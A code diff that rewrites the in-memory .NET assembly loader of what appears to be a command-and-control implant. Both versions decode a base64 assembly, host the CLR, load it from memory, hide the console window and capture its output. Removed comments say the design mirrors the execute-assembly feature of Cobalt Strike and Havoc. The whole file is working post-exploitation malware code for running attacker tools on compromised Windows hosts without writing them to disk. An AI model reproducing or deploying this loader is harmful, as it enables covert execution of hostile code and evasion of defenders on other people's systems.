@@ -1,307 +1,294 @@
-#include "InlineAssembly.h"
-#include "Helpers.h"
+#include "Commands.h"
 #include <metahost.h>
+#include <stdio.h>
+#include <string>
 #include <vector>
 #include <sstream>
 
 #pragma comment(lib, "mscoree.lib")
-
-// Import mscorlib type library — MSVC generates mscorlib.tlh/.tli on first build.
-// Requires .NET Framework 4.x to be installed on the build machine.
-// auto_rename: renames identifiers that clash with C++ reserved words (e.g. 'or' -> 'or__')
-//              which prevents the || parse errors in the generated TLH.
-#import <mscorlib.tlb> raw_interfaces_only auto_rename \
-    rename("ReportEvent", "MSCOREE_ReportEvent") \
-    rename("value",       "MSCOREE_value")        \
-    rename("Currency",    "MSCOREE_Currency")
-
 #define PIPE_BUFFER_LENGTH 0x10000
 
-// Helper: format an HRESULT as hex string.
-static std::string hrStr(HRESULT hr) {
-    char buf[16];
-    sprintf_s(buf, "0x%08lX", hr);
-    return buf;
+namespace mscorlib {
+#include "mscorlib.h"
+}
+
+HRESULT DotnetExecute(
+    _In_  PBYTE  AssemblyBytes,
+    _In_  ULONG  AssemblySize,
+    _In_  PWSTR  AppDomainName,
+    _In_  PWSTR  Arguments,
+    _Out_ LPSTR* OutputBuffer,
+    _Out_ PULONG OutputLength
+) {
+    HRESULT                HResult = S_OK;
+    ICLRMetaHost* IMetaHost = nullptr;
+    ICLRRuntimeInfo* IRuntimeInfo = nullptr;
+    ICorRuntimeHost* IRuntimeHost = nullptr;
+    IUnknown* IAppDomainThunk = nullptr;
+    mscorlib::_AppDomain* AppDomain = nullptr;
+    mscorlib::_Assembly* Assembly = nullptr;
+    mscorlib::_MethodInfo* MethodInfo = nullptr;
+    SAFEARRAYBOUND         SafeArrayBound = {};
+    SAFEARRAY* SafeAssembly = nullptr;
+    SAFEARRAY* SafeExpected = nullptr;
+    SAFEARRAY* SafeArguments = nullptr;
+    PWSTR* AssemblyArgv = nullptr;
+    ULONG                  AssemblyArgc = 0;
+    LONG                   Index = 0;
+    VARIANT                VariantArgv = {};
+    BOOL                   IsLoadable = FALSE;
+    HWND                   ConExist = nullptr;
+    HWND                   ConHandle = nullptr;
+    HANDLE                 BackupHandle = nullptr;
+    HANDLE                 IoPipeRead = nullptr;
+    HANDLE                 IoPipeWrite = nullptr;
+    SECURITY_ATTRIBUTES    SecurityAttr = {};
+
+    *OutputBuffer = nullptr;
+    *OutputLength = 0;
+
+    // 1. Instanciar el CLR MetaHost
+    HResult = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, reinterpret_cast<PVOID*>(&IMetaHost));
+    if (FAILED(HResult)) {
+        printf("[-] CLRCreateInstance Failed with Error: %lx\n", HResult);
+        goto _END_OF_FUNC;
+    }
+
+    // 2. Obtener la versión del Runtime v4
+    HResult = IMetaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, reinterpret_cast<PVOID*>(&IRuntimeInfo));
+    if (FAILED(HResult)) {
+        printf("[-] IMetaHost->GetRuntime Failed with Error: %lx\n", HResult);
+        goto _END_OF_FUNC;
+    }
+
+    // 3. Verificar si es cargable en este proceso
+    HResult = IRuntimeInfo->IsLoadable(&IsLoadable);
+    if (FAILED(HResult) || !IsLoadable) {
+        printf("[-] IRuntimeInfo->IsLoadable Failed or not loadable. Error: %lx\n", HResult);
+        goto _END_OF_FUNC;
+    }
+
+    // 4. Obtener interfaz del Host
+    HResult = IRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, reinterpret_cast<PVOID*>(&IRuntimeHost));
+    if (FAILED(HResult)) {
+        printf("[-] IRuntimeInfo->GetInterface Failed with Error: %lx\n", HResult);
+        goto _END_OF_FUNC;
+    }
+
+    // 5. Iniciar el CLR
+    HResult = IRuntimeHost->Start();
+    if (FAILED(HResult)) {
+        printf("[-] IRuntimeHost->Start Failed with Error: %lx\n", HResult);
+        goto _END_OF_FUNC;
+    }
+
+    // 6. Crear un nuevo AppDomain independiente
+    HResult = IRuntimeHost->CreateDomain(AppDomainName, nullptr, &IAppDomainThunk);
+    if (FAILED(HResult)) {
+        printf("[-] IRuntimeHost->CreateDomain Failed with Error: %lx\n", HResult);
+        goto _END_OF_FUNC;
+    }
+
+    // 7. Resolver interfaz del AppDomain
+    HResult = IAppDomainThunk->QueryInterface(IID_PPV_ARGS(&AppDomain));
+    if (FAILED(HResult)) {
+        printf("[-] IAppDomainThunk->QueryInterface Failed with Error: %lx\n", HResult);
+        goto _END_OF_FUNC;
+    }
+
+    // 8. Preparar el SafeArray con los bytes del ensamblado .NET
+    SafeArrayBound = { AssemblySize, 0 };
+    SafeAssembly = SafeArrayCreate(VT_UI1, 1, &SafeArrayBound);
+    if (!SafeAssembly) {
+        HResult = E_OUTOFMEMORY;
+        goto _END_OF_FUNC;
+    }
+    memcpy(SafeAssembly->pvData, AssemblyBytes, AssemblySize);
+
+    // 9. Cargar el ensamblado en el AppDomain
+    HResult = AppDomain->Load_3(SafeAssembly, &Assembly);
+    if (FAILED(HResult)) {
+        printf("[-] AppDomain->Load_3 Failed with Error: %lx\n", HResult);
+        goto _END_OF_FUNC;
+    }
+
+    // 10. Obtener el EntryPoint (Main)
+    HResult = Assembly->get_EntryPoint(&MethodInfo);
+    if (FAILED(HResult)) {
+        printf("[-] Assembly->get_EntryPoint Failed with Error: %lx\n", HResult);
+        goto _END_OF_FUNC;
+    }
+
+    // 11. Validar parámetros del método
+    HResult = MethodInfo->GetParameters(&SafeExpected);
+    if (FAILED(HResult)) {
+        printf("[-] MethodInfo->GetParameters Failed with Error: %lx\n", HResult);
+        goto _END_OF_FUNC;
+    }
+
+    // 12. Construcción de los argumentos de entrada para el Main
+    if (SafeExpected && SafeExpected->cDims && SafeExpected->rgsabound[0].cElements) {
+        SafeArguments = SafeArrayCreateVector(VT_VARIANT, 0, 1);
+        if (Arguments && wcslen(Arguments) > 0) {
+            AssemblyArgv = CommandLineToArgvW(Arguments, reinterpret_cast<PINT>(&AssemblyArgc));
+        }
+
+        VariantArgv.vt = (VT_ARRAY | VT_BSTR);
+        VariantArgv.parray = SafeArrayCreateVector(VT_BSTR, 0, AssemblyArgc);
+
+        for (Index = 0; Index < static_cast<LONG>(AssemblyArgc); Index++) {
+            // SOLUCIÓN 1: Llaves para aislar el scope de bstrArg
+            {
+                BSTR bstrArg = SysAllocString(AssemblyArgv[Index]);
+                SafeArrayPutElement(VariantArgv.parray, &Index, bstrArg);
+                SysFreeString(bstrArg);
+            }
+        }
+
+        Index = 0;
+        SafeArrayPutElement(SafeArguments, &Index, &VariantArgv);
+        SafeArrayDestroy(VariantArgv.parray);
+        VariantArgv.parray = nullptr;
+    }
+
+    // 13. Configurar redirección de salida mediante Pipes anónimos
+    SecurityAttr = { sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };
+    if (!CreatePipe(&IoPipeRead, &IoPipeWrite, &SecurityAttr, PIPE_BUFFER_LENGTH)) {
+        HResult = HRESULT_FROM_WIN32(GetLastError());
+        printf("[-] CreatePipe Failed with Error: %lx\n", HResult);
+        goto _END_OF_FUNC;
+    }
+
+    if (!(ConExist = GetConsoleWindow())) {
+        AllocConsole();
+        if ((ConHandle = GetConsoleWindow())) {
+            ShowWindow(ConHandle, SW_HIDE);
+        }
+    }
+
+    BackupHandle = GetStdHandle(STD_OUTPUT_HANDLE);
+    SetStdHandle(STD_OUTPUT_HANDLE, IoPipeWrite);
+
+    // 14. Ejecutar el ensamblado
+    // SOLUCIÓN 1: Llaves para aislar el scope de vtRet
+    {
+        VARIANT vtRet = {};
+        HResult = MethodInfo->Invoke_3(vtRet, SafeArguments, nullptr);
+        if (FAILED(HResult)) {
+            printf("[-] MethodInfo->Invoke_3 Failed with Error: %lx\n", HResult);
+        }
+    }
+
+    // 15. Restaurar el manejador de salida estándar de inmediato
+    if (BackupHandle) {
+        SetStdHandle(STD_OUTPUT_HANDLE, BackupHandle);
+        BackupHandle = nullptr;
+    }
+
+    // Cerrar el extremo de escritura para que ReadFile detecte el EOF y salga del bucle
+    if (IoPipeWrite) {
+        CloseHandle(IoPipeWrite);
+        IoPipeWrite = nullptr;
+    }
+
+    // 16. Leer la salida generada
+    *OutputBuffer = static_cast<LPSTR>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, PIPE_BUFFER_LENGTH));
+    if (*OutputBuffer) {
+        // SOLUCIÓN 1: Llaves para aislar el scope de bytesRead
+        {
+            DWORD bytesRead = 0;
+            if (!ReadFile(IoPipeRead, *OutputBuffer, PIPE_BUFFER_LENGTH - 1, &bytesRead, nullptr)) {
+                printf("[-] ReadFile Failed with Error: %lx\n", GetLastError());
+            }
+            *OutputLength = bytesRead;
+        }
+    }
+    else {
+        HResult = E_OUTOFMEMORY;
+    }
+
+_END_OF_FUNC:
+    if (BackupHandle) {
+        SetStdHandle(STD_OUTPUT_HANDLE, BackupHandle);
+    }
+    if (IoPipeWrite) CloseHandle(IoPipeWrite);
+    if (IoPipeRead)  CloseHandle(IoPipeRead);
+
+    if (AssemblyArgv) LocalFree(AssemblyArgv);
+
+    if (SafeAssembly)  SafeArrayDestroy(SafeAssembly);
+    if (SafeArguments) SafeArrayDestroy(SafeArguments);
+    if (SafeExpected)  SafeArrayDestroy(SafeExpected);
+
+    if (MethodInfo)       MethodInfo->Release();
+    if (Assembly)         Assembly->Release();
+    if (AppDomain)        AppDomain->Release();
+    if (IAppDomainThunk)  IAppDomainThunk->Release();
+    if (IRuntimeHost)     IRuntimeHost->Release();
+    if (IRuntimeInfo)     IRuntimeInfo->Release();
+    if (IMetaHost)        IMetaHost->Release();
+
+    return HResult;
+}
+
+PWSTR create_commandline_w(const std::vector<std::string>& arguments) {
+    if (arguments.empty()) return nullptr;
+
+    std::ostringstream oss;
+    for (size_t i = 0; i < arguments.size(); ++i) {
+        if (i > 0) oss << " ";
+        oss << arguments[i];
+    }
+    std::string cmdStr = oss.str();
+
+    int size_needed = MultiByteToWideChar(CP_UTF8, 0, cmdStr.c_str(), static_cast<int>(cmdStr.size()), NULL, 0);
+    wchar_t* cmdline = new wchar_t[size_needed + 1];
+    MultiByteToWideChar(CP_UTF8, 0, cmdStr.c_str(), static_cast<int>(cmdStr.size()), cmdline, size_needed);
+    cmdline[size_needed] = L'\0';
+
+    return reinterpret_cast<PWSTR>(cmdline);
 }
 
 std::string InlineAssembly(std::vector<std::string> arguments, const std::string& file_data) {
     if (file_data.empty())
         return "Error: no assembly data";
 
-    std::string assembly_bytes = base64_decode(file_data);
-    if (assembly_bytes.empty())
+    std::string assembly = base64_decode(file_data);
+    if (assembly.empty())
         return "Error: failed to decode assembly";
 
-    // ── PE / managed-assembly header validation ──────────────────────────────
-    // DataDirectory[14] (CLR COM descriptor) must be present and non-zero.
-    // Correct offsets from the start of the optional header:
-    //   PE32  (magic=0x10B): DataDirectory starts at +0x60, entry 14 at +0x60+14*8 = +0xD0
-    //   PE32+ (magic=0x20B): DataDirectory starts at +0x70, entry 14 at +0x70+14*8 = +0xE0
-    {
-        const auto*  bytes = reinterpret_cast<const BYTE*>(assembly_bytes.data());
-        const SIZE_T size  = assembly_bytes.size();
+    LPSTR outputBuff = nullptr;
+    ULONG outputLen = 0;
+    PWSTR appDomainManager = const_cast<PWSTR>(L"AppDomainManager");
 
-        if (size < 64 || bytes[0] != 'M' || bytes[1] != 'Z')
-            return "Error: not a PE file (missing MZ header) — select a managed .NET assembly";
+    PWSTR argumentsW = create_commandline_w(arguments);
 
-        DWORD peOffset = *reinterpret_cast<const DWORD*>(bytes + 0x3C);
-        if (size < static_cast<SIZE_T>(peOffset) + 24)
-            return "Error: PE header truncated";
+    HRESULT hr = DotnetExecute(
+        reinterpret_cast<PBYTE>(const_cast<char*>(assembly.data())),
+        static_cast<ULONG>(assembly.size()),
+        appDomainManager,
+        argumentsW,
+        &outputBuff,
+        &outputLen
+    );
 
-        if (bytes[peOffset]   != 'P' || bytes[peOffset+1] != 'E' ||
-            bytes[peOffset+2] != 0   || bytes[peOffset+3] != 0)
-            return "Error: invalid PE signature — select a managed .NET assembly";
-
-        DWORD optOffset = peOffset + 24;
-        WORD  magic     = *reinterpret_cast<const WORD*>(bytes + optOffset);
-        // DataDirectory[14] offset from optional header start
-        DWORD clrEntryOffset = (magic == 0x20B) ? 0xE0 : 0xD0;
-
-        if (size < static_cast<SIZE_T>(optOffset) + clrEntryOffset + 8)
-            return "Error: optional header too short — select a managed .NET EXE or DLL";
-
-        DWORD clrRva = *reinterpret_cast<const DWORD*>(bytes + optOffset + clrEntryOffset);
-        if (clrRva == 0)
-            return "Error: not a managed assembly (no CLR header) — select a .NET EXE or DLL";
-
-        // Check machine type against the current process architecture.
-        // The ARM64 CLR (v4.0.30319) rejects AMD64 assemblies with ERROR_BAD_FORMAT.
-        // AnyCPU assemblies have Machine=IMAGE_FILE_MACHINE_I386 + COMIMAGE_FLAGS_ILONLY.
-        WORD machine = *reinterpret_cast<const WORD*>(bytes + peOffset + 4);
-        SYSTEM_INFO si = {};
-        GetNativeSystemInfo(&si);
-        bool processIsArm64 = (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64);
-
-        if (processIsArm64 && machine == 0x8664 /* AMD64 */) {
-            return "Error: x64 assembly cannot run in ARM64 native process. "
-                   "Recompile the assembly as AnyCPU: "
-                   "set <PlatformTarget>AnyCPU</PlatformTarget> in the .csproj "
-                   "and ensure <Prefer32Bit>false</Prefer32Bit>.";
-        }
+    if (argumentsW) {
+        delete[] argumentsW;
     }
 
-    // ── CLR variable declarations ─────────────────────────────────────────────
-    HRESULT                 HResult         = S_OK;
-    const char*             failedStep      = nullptr;
-    ICLRMetaHost*           IMetaHost       = nullptr;
-    ICLRRuntimeInfo*        IRuntimeInfo    = nullptr;
-    ICorRuntimeHost*        IRuntimeHost    = nullptr;
-    IUnknown*               IAppDomainThunk = nullptr;
-    mscorlib::_AppDomain*   AppDomain       = nullptr;
-    mscorlib::_Assembly*    Assembly        = nullptr;
-    mscorlib::_MethodInfo*  MethodInfo      = nullptr;
-    SAFEARRAYBOUND          SafeArrayBound  = {};
-    SAFEARRAY*              SafeAssembly    = nullptr;
-    SAFEARRAY*              SafeExpected    = nullptr;
-    SAFEARRAY*              SafeArguments   = nullptr;
-    PWSTR*                  AssemblyArgv    = nullptr;
-    ULONG                   AssemblyArgc    = 0;
-    LONG                    Index           = 0;
-    VARIANT                 VariantArgv     = {};
-    BOOL                    IsLoadable      = FALSE;
-    HWND                    ConExist        = nullptr;
-    HWND                    ConHandle       = nullptr;
-    HANDLE                  BackupHandle    = nullptr;
-    HANDLE                  IoPipeRead      = nullptr;
-    HANDLE                  IoPipeWrite     = nullptr;
-    std::string             output;
-
-    // Build wide argument string for CommandLineToArgvW
-    std::wstring wargs;
-    for (size_t i = 0; i < arguments.size(); i++) {
-        if (i > 0) wargs += L' ';
-        wargs += std::wstring(arguments[i].begin(), arguments[i].end());
+    if (FAILED(hr)) {
+        if (outputBuff) HeapFree(GetProcessHeap(), 0, outputBuff);
+        return "Error: DotnetExecute failed with HRESULT " + std::to_string(hr);
     }
 
-#define CLR_STEP(expr, name)                        \
-    failedStep = name;                              \
-    if (FAILED(HResult = (expr))) goto _CLEANUP;
-
-    // ── CLR bootstrap ────────────────────────────────────────────────────────
-    CLR_STEP(CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost,
-                 reinterpret_cast<PVOID*>(&IMetaHost)),
-             "CLRCreateInstance")
-
-    CLR_STEP(IMetaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo,
-                 reinterpret_cast<PVOID*>(&IRuntimeInfo)),
-             "GetRuntime(v4.0.30319)")
-
-    failedStep = "IsLoadable";
-    if (FAILED(HResult = IRuntimeInfo->IsLoadable(&IsLoadable)) || !IsLoadable) {
-        if (SUCCEEDED(HResult)) HResult = E_FAIL;
-        goto _CLEANUP;
+    std::string output;
+    if (outputBuff && outputLen > 0) {
+        output = std::string(outputBuff, outputLen);
     }
 
-    CLR_STEP(IRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost,
-                 reinterpret_cast<PVOID*>(&IRuntimeHost)),
-             "GetInterface(CorRuntimeHost)")
-
-    CLR_STEP(IRuntimeHost->Start(), "IRuntimeHost::Start")
-
-    // ── AppDomain ────────────────────────────────────────────────────────────
-    // Use the default domain. CreateDomain without IAppDomainSetup inherits
-    // restrictive security policies that silently block AppDomain::Load_3.
-    // All working execute-assembly implementations (CS, Havoc, etc.) use the
-    // default domain for exactly this reason.
-    CLR_STEP(IRuntimeHost->GetDefaultDomain(&IAppDomainThunk),
-             "GetDefaultDomain")
-
-    CLR_STEP(IAppDomainThunk->QueryInterface(IID_PPV_ARGS(&AppDomain)),
-             "QueryInterface(_AppDomain)")
-
-    // ── Load assembly bytes via SAFEARRAY ────────────────────────────────────
-    {
-        PVOID pvData = nullptr;
-        SafeArrayBound = { static_cast<ULONG>(assembly_bytes.size()), 0 };
-        SafeAssembly   = SafeArrayCreate(VT_UI1, 1, &SafeArrayBound);
-        if (!SafeAssembly) { HResult = E_OUTOFMEMORY; failedStep = "SafeArrayCreate"; goto _CLEANUP; }
-        failedStep = "SafeArrayAccessData";
-        if (FAILED(HResult = SafeArrayAccessData(SafeAssembly, &pvData))) goto _CLEANUP;
-        memcpy(pvData, assembly_bytes.data(), assembly_bytes.size());
-        SafeArrayUnaccessData(SafeAssembly);
+    if (outputBuff) {
+        HeapFree(GetProcessHeap(), 0, outputBuff);
     }
 
-    // Load the assembly via IDispatch::Invoke instead of the TLH vtable.
-    // auto_rename can silently shift vtable offsets in the generated mscorlib.tlh
-    // if it omits or renames any method that precedes Load_3.  Calling by name
-    // through IDispatch is immune to vtable misalignment and is what most
-    // working execute-assembly implementations (CS, Havoc) use under the hood.
-    {
-        IDispatch* pDomainDisp = nullptr;
-        failedStep = "QueryInterface(IDispatch for AppDomain)";
-        if (FAILED(HResult = IAppDomainThunk->QueryInterface(IID_IDispatch,
-                reinterpret_cast<PVOID*>(&pDomainDisp))))
-            goto _CLEANUP;
-
-        OLECHAR* loadName = L"Load";
-        DISPID    loadId   = 0;
-        HResult = pDomainDisp->GetIDsOfNames(IID_NULL, &loadName, 1,
-                                             LOCALE_USER_DEFAULT, &loadId);
-        if (FAILED(HResult)) {
-            pDomainDisp->Release();
-            failedStep = "GetIDsOfNames(Load)";
-            goto _CLEANUP;
-        }
-
-        VARIANT varArg;
-        VariantInit(&varArg);
-        varArg.vt     = VT_ARRAY | VT_UI1;
-        varArg.parray = SafeAssembly;
-
-        DISPPARAMS dp   = {};
-        dp.rgvarg       = &varArg;
-        dp.cArgs        = 1;
-
-        VARIANT    varRes  = {};
-        EXCEPINFO  excep   = {};
-        UINT       argErr  = 0;
-        HResult = pDomainDisp->Invoke(loadId, IID_NULL, LOCALE_USER_DEFAULT,
-                                      DISPATCH_METHOD, &dp, &varRes, &excep, &argErr);
-        pDomainDisp->Release();
-
-        if (FAILED(HResult)) {
-            if (HResult == HRESULT_FROM_WIN32(ERROR_BAD_FORMAT)) {
-                return "Error: Assembly.Load failed (0x8007000B) — "
-                       "assembly must target .NET Framework 4.x, not .NET Core / .NET 5+. "
-                       "Set <TargetFramework>net48</TargetFramework> in the .csproj and recompile.";
-            }
-            failedStep = "IDispatch::Invoke(Load)";
-            goto _CLEANUP;
-        }
-
-        // Extract _Assembly from the result VARIANT (VT_DISPATCH or VT_UNKNOWN)
-        IUnknown* pUnk = nullptr;
-        if      (varRes.vt == VT_DISPATCH && varRes.pdispVal) pUnk = varRes.pdispVal;
-        else if (varRes.vt == VT_UNKNOWN  && varRes.punkVal)  pUnk = varRes.punkVal;
-
-        if (!pUnk) { HResult = E_NOINTERFACE; failedStep = "Load result empty"; goto _CLEANUP; }
-
-        HResult = pUnk->QueryInterface(IID_PPV_ARGS(&Assembly));
-        if (FAILED(HResult)) { pUnk->Release(); failedStep = "QueryInterface(_Assembly)"; goto _CLEANUP; }
-    }
-
-    // ── Entry point ──────────────────────────────────────────────────────────
-    CLR_STEP(Assembly->get_EntryPoint(&MethodInfo), "Assembly::get_EntryPoint")
-    CLR_STEP(MethodInfo->GetParameters(&SafeExpected), "MethodInfo::GetParameters")
-
-    // ── Build argument SAFEARRAY (only if entry point expects parameters) ────
-    if (SafeExpected && SafeExpected->cDims && SafeExpected->rgsabound[0].cElements) {
-        SafeArguments = SafeArrayCreateVector(VT_VARIANT, 0, 1);
-
-        if (!wargs.empty())
-            AssemblyArgv = CommandLineToArgvW(wargs.c_str(), reinterpret_cast<PINT>(&AssemblyArgc));
-
-        VariantArgv.parray = SafeArrayCreateVector(VT_BSTR, 0, AssemblyArgc);
-        VariantArgv.vt     = VT_ARRAY | VT_BSTR;
-
-        for (Index = 0; Index < static_cast<LONG>(AssemblyArgc); Index++)
-            SafeArrayPutElement(VariantArgv.parray, &Index, SysAllocString(AssemblyArgv[Index]));
-
-        Index = 0;
-        SafeArrayPutElement(SafeArguments, &Index, &VariantArgv);
-        SafeArrayDestroy(VariantArgv.parray);
-    }
-
-    // ── Pipe + stdout redirect ───────────────────────────────────────────────
-    if (!CreatePipe(&IoPipeRead, &IoPipeWrite, nullptr, PIPE_BUFFER_LENGTH)) {
-        HResult = HRESULT_FROM_WIN32(GetLastError());
-        failedStep = "CreatePipe";
-        goto _CLEANUP;
-    }
-
-    if (!(ConExist = GetConsoleWindow())) {
-        AllocConsole();
-        ConHandle = GetConsoleWindow();
-        if (ConHandle) ShowWindow(ConHandle, SW_HIDE);
-    }
-
-    BackupHandle = GetStdHandle(STD_OUTPUT_HANDLE);
-    SetStdHandle(STD_OUTPUT_HANDLE, IoPipeWrite);
-
-    // ── Invoke entry point ───────────────────────────────────────────────────
-    MethodInfo->Invoke_3(VARIANT(), SafeArguments, nullptr);
-
-    // Restore stdout before reading
-    SetStdHandle(STD_OUTPUT_HANDLE, BackupHandle);
-    BackupHandle = nullptr;
-    failedStep   = nullptr;
-
-    // ── Drain pipe (non-blocking) ────────────────────────────────────────────
-    {
-        DWORD bytesAvailable = 0;
-        while (PeekNamedPipe(IoPipeRead, nullptr, 0, nullptr, &bytesAvailable, nullptr)
-               && bytesAvailable > 0) {
-            std::vector<char> buf(bytesAvailable);
-            DWORD bytesRead = 0;
-            if (ReadFile(IoPipeRead, buf.data(), bytesAvailable, &bytesRead, nullptr) && bytesRead > 0)
-                output.append(buf.data(), bytesRead);
-        }
-    }
-
-#undef CLR_STEP
-
-_CLEANUP:
-    if (BackupHandle)           SetStdHandle(STD_OUTPUT_HANDLE, BackupHandle);
-    if (AssemblyArgv)           LocalFree(AssemblyArgv);
-    if (SafeAssembly)           SafeArrayDestroy(SafeAssembly);
-    if (SafeArguments)          SafeArrayDestroy(SafeArguments);
-    if (MethodInfo)             MethodInfo->Release();
-    if (AppDomain)              AppDomain->Release();
-    if (IAppDomainThunk)        IAppDomainThunk->Release();
-    if (IRuntimeHost)           IRuntimeHost->Release();
-    if (IRuntimeInfo)           IRuntimeInfo->Release();
-    if (IMetaHost)              IMetaHost->Release();
-    if (IoPipeWrite)            CloseHandle(IoPipeWrite);
-    if (IoPipeRead)             CloseHandle(IoPipeRead);
-    if (ConHandle && !ConExist) FreeConsole();
-
-    if (FAILED(HResult)) {
-        std::string msg = "Error: ";
-        if (failedStep) msg += std::string(failedStep) + " failed";
-        else            msg += "CLR execution failed";
-        msg += " (HRESULT " + hrStr(HResult) + ")";
-        return msg;
-    }
-
-    return output.empty() ? "(no output)" : output;
+    return output;
 }
